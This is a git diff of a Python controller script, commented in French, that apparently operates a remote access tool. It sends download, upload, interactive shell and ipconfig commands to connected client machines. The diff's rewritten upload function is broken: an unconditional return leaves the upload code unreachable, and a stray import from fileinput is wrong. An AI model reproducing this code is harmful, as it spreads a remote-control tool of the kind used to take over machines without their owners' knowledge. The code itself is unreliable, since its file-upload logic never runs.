@@ -1,3 +1,4 @@
+from fileinput import filename
 import socket
 import ssl
 import os
@@ -16,8 +17,19 @@ def download(client_socket):
     client_socket.send(b'download')  # Envoie de la commande
 
 # Fonction permettant de charger un fichier au client
-def upload(client_socket):
-    client_socket.send(b'upload')  # Envoie de la commande
+def upload(client_socket, filename):
+    while True:
+        filename = input("[?] Entrez le nom du fichier à télécharger : ") # Récupération saisie du nom du fichier
+        if filename.strip() == "":
+            print("[!] Le nom du fichier ne peut pas être vide !")
+        else:        
+            if not os.path.exists(filename): # Vérification de l'existence du chemin
+                print("[!] Fichier introuvable")
+                client_socket.send(b'Fichier introuvable')
+        return
+        client_socket.send(b'upload')
+        client_socket.send(filename.encode())
+        requete_recue = client_socket.recv(4096).decode()
 
 # Fonction permettant d'initier un shell intéractif sur le client
 def shell(client_socket, client_ip):
@@ -106,7 +118,7 @@ def main():
             elif command.lower() == 'download':
                 download(client_socket)
             elif command.lower() == 'upload':
-                upload(client_socket)
+                upload(client_socket, filename)
             elif command.lower() == 'shell':
                 shell(client_socket, client_ip)
             elif command.lower() == 'ipconfig':
